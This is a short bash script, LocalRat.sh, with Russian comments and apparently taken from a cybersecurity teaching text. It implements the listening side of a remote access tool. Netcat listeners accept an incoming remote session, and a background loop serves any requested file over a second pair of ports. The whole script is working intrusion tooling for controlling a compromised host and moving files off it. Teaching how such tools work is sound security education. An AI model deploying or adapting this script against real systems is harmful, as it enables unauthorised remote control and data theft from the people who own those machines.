#!/bin/bash -
#
# Bash и кибербезопасность
# LocalRat.sh
#
# Описание:
# Инструмент удаленного доступа для локальной системы,
# прослушивает соединение с удаленной системой
# и помогает с любой запрошенной передачей файла
#
# Использование: LocalRat.sh port1 [port2 [port3]]
#
#
# определяем наш демон фоновой передачи файлов
function bgfilexfer ()
{
while true
do
FN=$(nc -nlvvp $HOMEPORT2 2>>/tmp/x2.err)
if [[ $FN == 'exit' ]] ; then exit ; fi
nc -nlp $HOMEPORT3 < $FN
done
}
# -------------------- main ---------------------
HOMEPORT=$1
HOMEPORT2=${2:-$((HOMEPORT+1))}
HOMEPORT3=${3:-$((HOMEPORT2+1))}
# инициируем демон фоновой передачи файлов
bgfilexfer &
# прослушиваем входящее соединение
nc -nlvp $HOMEPORT